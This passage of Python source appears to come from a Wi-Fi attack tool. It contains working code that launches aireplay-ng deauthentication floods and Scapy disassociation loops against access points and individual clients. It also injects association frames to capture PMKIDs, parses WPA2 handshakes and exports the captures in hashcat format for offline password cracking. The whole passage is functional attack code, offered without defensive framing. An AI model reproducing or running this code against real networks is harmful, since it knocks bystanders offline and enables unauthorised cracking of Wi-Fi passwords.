                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
            self._log("info", f"aireplay-ng deauth -> {target_desc} (PID {proc.pid})")
            return proc
        except Exception as e:
            self._log("error", f"Failed to spawn aireplay-ng for {target_desc}: {e}")
            return None

    def _monitor_aireplay(self, proc: subprocess.Popen, label: str):
        """Read aireplay-ng output and count sent frames."""
        try:
            for raw_line in iter(proc.stdout.readline, b""):
                if not self.deauth_running:
                    break
                line = raw_line.decode("utf-8", errors="ignore").strip()
                if not line:
                    continue
                # aireplay-ng prints lines like:
                #   "Sending 64 directed DeAuth (code 7)..."
                #   "Sending DeAuth (code 7) to broadcast..."
                if "sending" in line.lower() and "deauth" in line.lower():
                    # Extract count from "Sending 64 directed DeAuth"
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p.lower() == "sending" and i + 1 < len(parts):
                            try:
                                n = int(parts[i + 1])
                                self.deauth_count += n
                            except ValueError:
                                self.deauth_count += 64  # default burst
                            break
                    else:
                        self.deauth_count += 64
        except Exception:
            pass

    def _disassoc_loop(self, interface: str, bssid_list: List[str], clients: set,
                       targeted_only: bool = False):
        """
        Send 802.11 disassociation frames (subtype 0xA0) via Scapy raw socket.

        When targeted_only=False (AP deauth): sends broadcast + per-client disassoc.
        When targeted_only=True (client deauth): sends ONLY per-client disassoc,
        no broadcast — so other clients on the AP are not affected.
        """
        if not SCAPY_AVAILABLE:
            return

        def build_disassoc_frames():
            """Build disassoc frames for all BSSIDs and known clients."""
            frame_list = []
            for bssid in bssid_list:
                # Broadcast disassoc: AP -> all clients (SKIP for targeted mode)
                if not targeted_only:
                    frame_list.append(bytes(
                        RadioTap() /
                        Dot11(type=0, subtype=10,
                              addr1="ff:ff:ff:ff:ff:ff",
                              addr2=bssid,
                              addr3=bssid) /
                        Dot11Disas(reason=8)
                    ))
                # Per-client disassoc in both directions
                for client in clients:
                    frame_list.append(bytes(
                        RadioTap() /
                        Dot11(type=0, subtype=10,
                              addr1=client,
                              addr2=bssid,
                              addr3=bssid) /
                        Dot11Disas(reason=8)
                    ))
                    frame_list.append(bytes(
                        RadioTap() /
                        Dot11(type=0, subtype=10,
                              addr1=bssid,
                              addr2=client,
                              addr3=bssid) /
                        Dot11Disas(reason=8)
                    ))
            return frame_list

        try:
            sock = conf.L2socket(iface=interface)
        except Exception as e:
            self._log("warning", f"Disassoc socket failed: {e}")
            return

        frames = build_disassoc_frames()
        self._log("info", f"Disassoc loop started — {len(frames)} frame variants "
                  f"across {len(bssid_list)} AP(s)")

        last_frame_count = len(frames)
        try:
            while self.deauth_running:
                # Rebuild frames if client set changed
                expected = len(clients) * len(bssid_list) * 2 + (0 if targeted_only else len(bssid_list))
                if expected != last_frame_count:
                    frames = build_disassoc_frames()
                    last_frame_count = len(frames)

                for _ in range(32):
                    for frame in frames:
                        sock.send(frame)
                self.deauth_count += 32 * len(frames)
                time.sleep(0.05)
        except Exception as e:
            self._log("warning", f"Disassoc error: {e}")
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _launch_broadcast_deauth(self, interface: str, bssid: str, count: int):
        """Spawn 2 broadcast aireplay-ng processes for an AP — instant, no waiting."""
        for i in range(2):
            proc = self._spawn_aireplay(interface, bssid, count=count)
            if proc:
                self._deauth_processes.append(proc)
                threading.Thread(
                    target=self._monitor_aireplay,
                    args=(proc, f"{bssid}/broadcast-{i}"),
                    daemon=True,
                ).start()

    def _launch_client_deauth(self, interface: str, bssid: str,
                              client_mac: str, count: int):
        """Spawn targeted aireplay-ng for a specific client."""
        proc = self._spawn_aireplay(
            interface, bssid, client_mac=client_mac, count=count
        )
        if proc:
            self._deauth_processes.append(proc)
            threading.Thread(
                target=self._monitor_aireplay,
                args=(proc, f"{bssid}/{client_mac}"),
                daemon=True,
            ).start()

    def _deauth_loop_multi(self, interface: str, target_list: List[Dict],
                           count: int, client_list: List[Dict] = None):
        """
        Deauth with two modes:
          - AP targets: broadcast deauth (hits all clients on AP)
          - Client targets: targeted deauth with -c flag (hits only that client)
        """
        client_list = client_list or []
        bssid_list = [t["bssid"] for t in target_list]

        # AP broadcast deauth — instant, like deauther.c "attack -t deauth"
        for t in target_list:
            if not self.deauth_running:
                return
            bssid = t["bssid"]
            ch = t.get("channel", 0)
            if ch > 0:
                self.set_channel(interface, ch)
                time.sleep(0.1)
            self._launch_broadcast_deauth(interface, bssid, count)

        # Targeted client deauth — aireplay-ng -a BSSID -c CLIENT per client
        # Only deauths that specific client, not the whole AP
        for c in client_list:
            if not self.deauth_running:
                return
            bssid = c["bssid"]
            ch = c.get("channel", 0)
            if ch > 0:
                self.set_channel(interface, ch)
                time.sleep(0.1)
            # Spawn 2 targeted processes per client for more aggressive deauth
            for i in range(2):
                self._launch_client_deauth(interface, bssid, c["mac"], count)
            if bssid not in bssid_list:
                bssid_list.append(bssid)

        desc_parts = []
        if target_list:
            desc_parts.append(f"{len(target_list)} AP(s) broadcast")
        if client_list:
            desc_parts.append(f"{len(client_list)} client(s) targeted")
        self._log("warning", f"Deauth running: {' + '.join(desc_parts)} — "
                  f"{len(self._deauth_processes)} aireplay-ng processes")

        # Disassoc loop — targeted_only=True when doing client deauth (no broadcast)
        is_client_only = len(client_list) > 0 and len(target_list) == 0
        self._disassoc_clients = set(c["mac"] for c in client_list)
        if bssid_list:
            threading.Thread(
                target=self._disassoc_loop,
                args=(interface, bssid_list, self._disassoc_clients, is_client_only),
                daemon=True,
            ).start()

        # Wait until stopped — aireplay-ng handles everything
        while self.deauth_running:
            time.sleep(3)

        # Cleanup
        for proc in self._deauth_processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._deauth_processes = []

        for t in target_list:
            bssid = t["bssid"]
            if bssid in self.networks:
                self.networks[bssid].clients.update(self.deauth_clients)
        self.deauth_running = False
        self._log("info", f"Deauth finished. {self.deauth_count} frames, "
                  f"{len(self.deauth_clients)} client(s) across "
                  f"{len(target_list)} AP(s)")

    # ─── Active PMKID Capture (test.py approach) ──────────────────────
    #
    # Works like test.py with monitor mode:
    # 1. Interface stays in MONITOR mode
    # 2. Open raw socket on the interface to capture all frames
    # 3. Inject auth + association frames via Scapy to trigger the AP
    # 4. AP responds with EAPOL → raw socket captures it → extract PMKID
    #
    # The raw socket + offset approach matches test.py exactly.

    def _get_interface_mac(self, interface: str) -> str:
        """Get the MAC address of an interface."""
        try:
            with open(f"/sys/class/net/{interface}/address") as f:
                return f.read().strip()
        except Exception:
            pass
        try:
            mac = get_if_hwaddr(interface)
            if mac and mac != "00:00:00:00:00:00":
                return mac
        except Exception:
            pass
        return "00:00:00:00:00:00"

    def _extract_pmkid_from_raw(self, frame_data: bytes) -> Optional[str]:
        """
        Extract PMKID from raw frame data.
        Searches for the PMKID KDE tag (dd 14 00 0f ac 04) in the frame.
        Falls back to last-16-bytes method (like test.py).
        """
        # Method 1: Search for PMKID KDE tag
        pmkid_kde = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        idx = frame_data.find(pmkid_kde)
        if idx != -1:
            pmkid_start = idx + 6
            pmkid = frame_data[pmkid_start:pmkid_start + 16]
            if len(pmkid) == 16 and pmkid != b'\x00' * 16:
                return pmkid.hex()

        # Method 2: Search for OUI + type 04 (PMKID)
        oui_pattern = bytes([0x00, 0x0f, 0xac, 0x04])
        idx = frame_data.find(oui_pattern)
        if idx != -1:
            pmkid_start = idx + 4
            pmkid = frame_data[pmkid_start:pmkid_start + 16]
            if len(pmkid) == 16 and pmkid != b'\x00' * 16:
                return pmkid.hex()

        # Method 3: Last 16 bytes (test.py fallback)
        if len(frame_data) >= 16:
            pmkid = frame_data[-16:]
            if pmkid != b'\x00' * 16:
                return pmkid.hex()

        return None

    def _inject_to_ap(self, interface: str, target_bssid: str,
                      ssid: str, client_mac: str):
        """
        Inject auth + association frames to trigger EAPOL from the AP.
        Works in monitor mode via Scapy frame injection.
        """
        if not SCAPY_AVAILABLE:
            self._log("error", "Scapy required for frame injection")
            return

        # Authentication frame (Open System)
        auth_frame = (
            RadioTap() /
            Dot11(
                type=0, subtype=11,
                addr1=target_bssid,
                addr2=client_mac,
                addr3=target_bssid,
            ) /
            Dot11Auth(algo=0, seqnum=1, status=0)
        )

        try:
            sendp(auth_frame, iface=interface, count=5, inter=0.1, verbose=False)
            self._log("info", f"Sent auth to {target_bssid}")
        except Exception as e:
            self._log("error", f"Auth inject failed: {e}")
            return

        time.sleep(0.5)

        # Association Request with RSN IE (WPA2-PSK)
        rsn_ie = bytes([
            0x01, 0x00,              # RSN Version 1
            0x00, 0x0f, 0xac, 0x04,  # Group Cipher: CCMP
            0x01, 0x00,              # Pairwise Cipher Count: 1
            0x00, 0x0f, 0xac, 0x04,  # Pairwise Cipher: CCMP
            0x01, 0x00,              # AKM Count: 1
            0x00, 0x0f, 0xac, 0x02,  # AKM: PSK
            0x00, 0x00,              # RSN Capabilities
        ])

        assoc_frame = (
            RadioTap() /
            Dot11(
                type=0, subtype=0,
                addr1=target_bssid,
                addr2=client_mac,
                addr3=target_bssid,
            ) /
            Dot11AssoReq(cap=0x1105, listen_interval=3) /
            Dot11Elt(ID=0, info=ssid.encode()) /
            Dot11Elt(ID=1, info=bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])) /
            Dot11Elt(ID=48, info=rsn_ie)
        )

        try:
            sendp(assoc_frame, iface=interface, count=5, inter=0.1, verbose=False)
            self._log("info", f"Sent assoc to {target_bssid} (SSID: {ssid})")
        except Exception as e:
            self._log("error", f"Assoc inject failed: {e}")

    def _capture_pmkid_for_target(self, interface: str, ssid: str,
                                   bssid: str, channel: int = 0,
                                   timeout: int = 15) -> Optional[Dict]:
        """
        Capture PMKID for a single target network.
        Like test.py: raw socket on monitor mode interface.
        Injects auth+assoc frames via Scapy to trigger the AP.

        Args:
            interface: WiFi interface (in monitor mode)
            ssid: Target network SSID
            bssid: Target BSSID
            channel: AP channel
            timeout: Max seconds to wait

        Returns:
            Dict with PMKID data, or None
        """
        self._log("info", f"Targeting '{ssid}' ({bssid}) on channel {channel}...")

        # Set channel to match AP
        if channel > 0:
            self.set_channel(interface, channel)
            time.sleep(0.3)

        client_mac = self._get_interface_mac(interface)

        # Open raw socket (same as test.py)
        try:
            raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            raw_sock.bind((interface, 0))
            raw_sock.settimeout(1.0)
        except Exception as e:
            self._log("error", f"Failed to open raw socket: {e}")
            return None

        result = None

        try:
            # Inject auth + assoc frames to trigger EAPOL from AP
            self._inject_to_ap(interface, bssid, ssid, client_mac)

            # Capture frames like test.py
            frame_num = 0
            pmkid = None
            mac_ap = None
            mac_cl = None
            start_time = time.time()

            while (time.time() - start_time) < timeout and self.running:
                try:
                    packet = raw_sock.recvfrom(2048)[0]
                except socket.timeout:
                    # Re-inject periodically to keep triggering AP
                    if (time.time() - start_time) % 5 < 1:
                        self._inject_to_ap(interface, bssid, ssid, client_mac)
                    continue

                self.packet_count += 1

                # Same as test.py: offset=2, process frame
                frame_body = packet[2:]

                frame_num += 1

                if frame_num == 1:
                    pmkid = self._extract_pmkid_from_raw(frame_body)
                    if len(frame_body) >= 10:
                        mac_ap = frame_body[4:10].hex()

                if frame_num == 2:
                    if len(frame_body) >= 10:
                        mac_cl = frame_body[4:10].hex()

                    if pmkid and mac_ap:
                        if not mac_cl:
                            mac_cl = client_mac.replace(":", "")

                        self.eapol_count += 2
                        self._log("warning", f"PMKID CAPTURED from '{ssid}'!")
                        self._log("info", f"PMKID: {pmkid}")
                        self._log("info", f"MAC AP: {mac_ap}")
                        self._log("info", f"MAC Client: {mac_cl}")

                        bssid_formatted = ':'.join(mac_ap[i:i+2] for i in range(0, 12, 2))
                        ssid_hex = ssid.encode("utf-8").hex()
                        hashcat_line = f"WPA*01*{pmkid}*{mac_ap}*{mac_cl}*{ssid_hex}***"

                        result = {
                            "pmkid": pmkid,
                            "mac_ap": mac_ap,
                            "mac_client": mac_cl,
                            "ssid": ssid,
                            "ssid_hex": ssid_hex,
                            "bssid": bssid_formatted,
                            "timestamp": datetime.now().isoformat(),
                            "hashcat_line": hashcat_line,
                        }
                        self._log("info", f"Hashcat: {hashcat_line}")
                        break

            if not result:
                self._log("warning", f"No PMKID captured for '{ssid}' (timed out after {timeout}s)")

        except Exception as e:
            self._log("error", f"Capture error: {e}")
        finally:
            raw_sock.close()

        return result

    # ─── PMKID / EAPOL Capture ──────────────────────────────────────

    def start_capture(self, interface: str, target_bssid: str = None,
                      duration: int = 60) -> Dict:
        """
        Capture PMKID using monitor mode (like test.py):
        1. Interface stays in monitor mode
        2. Raw socket captures all frames on the interface
        3. Inject auth + assoc frames via Scapy to trigger each AP
        4. AP responds with EAPOL containing PMKID
        5. Extract and format for hashcat

        Args:
            interface: WiFi interface name (must be in monitor mode)
            target_bssid: Optional BSSID filter
            duration: Max capture duration in seconds

        Returns:
            Dict with capture results
        """
        self._log("info", f"Starting PMKID capture on {interface} (duration: {duration}s)")
        if target_bssid:
            self._log("info", f"Target BSSID: {target_bssid}")

        self.running = True
        self.captured_pmkids.clear()
        self.captured_handshakes.clear()
        self.eapol_frames.clear()
        self.packet_count = 0
        self.eapol_count = 0

        # Build target list
        targets = []
        if target_bssid:
            ssid = ""
            channel = 0
            if target_bssid in self.networks:
                ssid = self.networks[target_bssid].ssid
                channel = self.networks[target_bssid].channel
            targets = [{"ssid": ssid, "bssid": target_bssid, "channel": channel}]
        else:
            for bssid, net in self.networks.items():
                if "wpa" in net.encryption.lower() or "WPA" in net.encryption:
                    targets.append({
                        "ssid": net.ssid,
                        "bssid": bssid,
                        "channel": net.channel,
                    })

        if not targets:
            self._log("warning", "No target APs found. Run a scan first, or specify a BSSID.")

        # Capture PMKID for each target
        start_time = time.time()
        for target in targets:
            if not self.running:
                break
            if (time.time() - start_time) >= duration:
                self._log("info", "Duration limit reached")
                break

            ssid = target["ssid"]
            bssid = target.get("bssid", "")

            if not ssid or ssid == "<Hidden>":
                self._log("warning", f"Skipping {bssid} (hidden SSID)")
                continue

            remaining = max(10, int(duration - (time.time() - start_time)))
            capture = self._capture_pmkid_for_target(
                interface, ssid, bssid,
                channel=target.get("channel", 0),
                timeout=min(remaining, 15),
            )

            if capture:
                with self.lock:
                    existing = any(
                        p["pmkid"] == capture["pmkid"] for p in self.captured_pmkids
                    )
                    if not existing:
                        self.captured_pmkids.append(capture)

            # Brief pause between targets
            time.sleep(1)

        self.running = False

        result = {
            "packets_captured": self.packet_count,
            "eapol_frames": self.eapol_count,
            "pmkids": self.captured_pmkids,
            "handshakes": self.captured_handshakes,
            "duration": int(time.time() - start_time),
        }

        self._log("info",
                   f"Capture complete: {self.packet_count} packets, "
                   f"{self.eapol_count} EAPOL, {len(self.captured_pmkids)} PMKIDs")

        return result

    def stop_capture(self):
        """Stop an active capture."""
        self.running = False
        self._log("info", "Capture stopped by user")

    def _process_capture_packet(self, packet):
        """Process a packet during PMKID capture."""
        self.packet_count += 1

        # Process beacons too (for network info)
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            self._process_beacon(packet)

        # Process EAPOL frames
        if packet.haslayer(EAPOL):
            self._process_eapol(packet)

    def _process_eapol(self, packet):
        """
        Process an EAPOL frame and extract PMKID if present.

        EAPOL Key frame structure (simplified):
        - Key Descriptor Type (1 byte)
        - Key Information (2 bytes)
        - Key Length (2 bytes)
        - Replay Counter (8 bytes)
        - Key Nonce (32 bytes)
        - Key IV (16 bytes)
        - Key RSC (8 bytes)
        - Key ID (8 bytes)
        - Key MIC (16 bytes)
        - Key Data Length (2 bytes)
        - Key Data (variable) -- PMKID is here in Message 1
        """
        self.eapol_count += 1

        try:
            # Get MAC addresses from the 802.11 header
            if packet.haslayer(Dot11):
                # In WPA2 4-way handshake:
                # Message 1 (AP -> Client): addr1=client, addr2=AP, addr3=AP
                # Message 2 (Client -> AP): addr1=AP, addr2=client, addr3=AP
                addr1 = packet[Dot11].addr1  # Destination
                addr2 = packet[Dot11].addr2  # Source
                addr3 = packet[Dot11].addr3  # BSSID
            elif packet.haslayer(Ether):
                addr1 = packet[Ether].dst
                addr2 = packet[Ether].src
                addr3 = addr2  # Best guess
            else:
                return

            # Get raw EAPOL data
            eapol_layer = packet[EAPOL]
            raw_data = bytes(eapol_layer)

            if len(raw_data) < 99:  # Minimum EAPOL key frame size
                return

            # Parse EAPOL key frame
            # Byte 1: descriptor type (should be 2 for RSN)
            # Bytes 2-3: key info
            # Bytes 4-5: key length
            key_info = struct.unpack("!H", raw_data[1:3])[0] if len(raw_data) > 3 else 0

            # Key info bits:
            # Bit 3: Install
            # Bit 6: Key ACK
            # Bit 7: Key MIC
            # Bit 8: Secure
            has_ack = bool(key_info & (1 << 7))
            has_mic = bool(key_info & (1 << 8))
            is_install = bool(key_info & (1 << 6))

            # Determine message number:
            # Message 1: ACK=1, MIC=0 (AP -> Client)
            # Message 2: ACK=0, MIC=1 (Client -> AP)
            # Message 3: ACK=1, MIC=1, Install=1 (AP -> Client)
            # Message 4: ACK=0, MIC=1 (Client -> AP, no nonce)

            if has_ack and not has_mic:
                # Message 1 from AP -- this is where PMKID lives
                msg_num = 1
                mac_ap = addr2
                mac_client = addr1
            elif not has_ack and has_mic and not is_install:
                msg_num = 2
                mac_ap = addr1
                mac_client = addr2
            elif has_ack and has_mic:
                msg_num = 3
                mac_ap = addr2
                mac_client = addr1
            else:
                msg_num = 4
                mac_ap = addr1
                mac_client = addr2

            bssid = addr3 or mac_ap

            self._log("info",
                       f"EAPOL Message {msg_num}: "
                       f"AP={mac_ap} Client={mac_client}")

            # Store frame for handshake tracking
            if bssid not in self.eapol_frames:
                self.eapol_frames[bssid] = {}
            self.eapol_frames[bssid][msg_num] = {
                "raw": raw_data.hex(),
                "mac_ap": mac_ap,
                "mac_client": mac_client,
                "timestamp": datetime.now().isoformat(),
            }

            # Extract PMKID from Message 1
            if msg_num == 1:
                pmkid = self._extract_pmkid(raw_data)
                if pmkid:
                    # Look up SSID from our network list
                    ssid = ""
                    if bssid in self.networks:
                        ssid = self.networks[bssid].ssid

                    capture = {
                        "pmkid": pmkid,
                        "mac_ap": mac_ap.replace(":", ""),
                        "mac_client": mac_client.replace(":", ""),
                        "ssid": ssid,
                        "ssid_hex": ssid.encode("utf-8").hex() if ssid else "",
                        "bssid": bssid,
                        "timestamp": datetime.now().isoformat(),
                        "hashcat_line": self._format_hashcat(
                            pmkid, mac_ap, mac_client, ssid
                        ),
                    }
                    with self.lock:
                        self.captured_pmkids.append(capture)

                    self._log("warning",
                               f"PMKID CAPTURED from {bssid} ({ssid})!")

            # Check if we have a complete handshake (messages 1+2 or 2+3)
            if bssid in self.eapol_frames:
                frames = self.eapol_frames[bssid]
                if 1 in frames and 2 in frames:
                    ssid = ""
                    if bssid in self.networks:
                        ssid = self.networks[bssid].ssid

                    handshake = {
                        "bssid": bssid,
                        "ssid": ssid,
                        "mac_ap": frames[1]["mac_ap"],
                        "mac_client": frames[1]["mac_client"],
                        "messages": list(frames.keys()),
                        "timestamp": datetime.now().isoformat(),
                    }

                    # Check if this handshake is already captured
                    existing = any(
                        h["bssid"] == bssid and h["mac_client"] == handshake["mac_client"]
                        for h in self.captured_handshakes
                    )
                    if not existing:
                        with self.lock:
                            self.captured_handshakes.append(handshake)
                        self._log("warning",
                                   f"WPA2 HANDSHAKE captured from {bssid} ({ssid})!")

        except Exception as e:
            self._log("error", f"EAPOL processing error: {e}")

    def _extract_pmkid(self, eapol_data: bytes) -> Optional[str]:
        """
        Extract PMKID from EAPOL Message 1 Key Data field.

        The Key Data in Message 1 contains RSN KDEs (Key Data Encapsulations).
        PMKID KDE format:
          dd 14 00 0f ac 04 [16 bytes PMKID]
          ^  ^  ^        ^   ^
          |  |  |        |   +-- PMKID (16 bytes)
          |  |  |        +-- Type 4 = PMKID
          |  |  +-- OUI: 00:0f:ac (IEEE 802.11)
          |  +-- Length: 20 bytes
          +-- Tag: 0xdd (vendor specific)
        """
        try:
            # Key Data Length is at offset 95-96 (2 bytes, big-endian)
            if len(eapol_data) < 97:
                return None

            key_data_len = struct.unpack("!H", eapol_data[95:97])[0]

            if key_data_len == 0:
                return None

            # Key Data starts at offset 97
            key_data = eapol_data[97:97 + key_data_len]

            # Search for PMKID KDE: dd 14 00 0f ac 04
            pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])

            idx = key_data.find(pmkid_tag)
            if idx != -1:
                pmkid_start = idx + 6  # Skip the 6-byte tag
                pmkid = key_data[pmkid_start:pmkid_start + 16]
                if len(pmkid) == 16:
                    pmkid_hex = pmkid.hex()
                    # Validate: PMKID should not be all zeros
                    if pmkid_hex != "0" * 32:
                        return pmkid_hex

            # Fallback: some APs put PMKID differently
            # Search for OUI 00:0f:ac anywhere in key data
            oui_pattern = bytes([0x00, 0x0f, 0xac, 0x04])
            idx = key_data.find(oui_pattern)
            if idx != -1:
                pmkid_start = idx + 4
                pmkid = key_data[pmkid_start:pmkid_start + 16]
                if len(pmkid) == 16 and pmkid.hex() != "0" * 32:
                    return pmkid.hex()

            return None

        except Exception:
            return None

    def _format_hashcat(self, pmkid: str, mac_ap: str, mac_client: str,
                        ssid: str) -> str:
        """Format PMKID for hashcat hc22000 (mode 22000)."""
        mac_ap_clean = mac_ap.replace(":", "").lower()
        mac_client_clean = mac_client.replace(":", "").lower()
        ssid_hex = ssid.encode("utf-8").hex() if ssid else ""

        return f"WPA*01*{pmkid}*{mac_ap_clean}*{mac_client_clean}*{ssid_hex}***"

    # ─── Results & Export ────────────────────────────────────────────

    def get_status(self) -> Dict:
        """Get current capture status."""
        with self.lock:
            return {
                "running": self.running,
                "scanning": self.scanning,
                "monitor_mode": self.monitor_mode_active,
                "interface": self.interface,
                "packets": self.packet_count,
                "eapol_frames": self.eapol_count,
                "pmkids_captured": len(self.captured_pmkids),
                "handshakes_captured": len(self.captured_handshakes),
                "networks_seen": len(self.networks),
            }

    def get_results(self) -> Dict:
        """Get all capture results."""
        with self.lock:
            return {
                "pmkids": list(self.captured_pmkids),
                "handshakes": list(self.captured_handshakes),
                "networks": [n.to_dict() for n in self.networks.values()],
                "log": list(self.log_entries[-50:]),
            }

    def export_hashcat(self, filepath: str = None) -> str:
        """Export captured PMKIDs in hashcat hc22000 format."""
        if not filepath:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = f"pmkid_capture_{timestamp}.hc22000"

        lines = []
        for capture in self.captured_pmkids:
            lines.append(capture["hashcat_line"])

        if lines:
            with open(filepath, "w") as f:
                f.write("\n".join(lines) + "\n")
            self._log("info", f"Exported {len(lines)} PMKIDs to {filepath}")
            return filepath

        return ""

    def get_log(self, n: int = 50) -> List[Dict]:
        """Get recent log entries."""
        with self.lock:
            return list(self.log_entries[-n:])
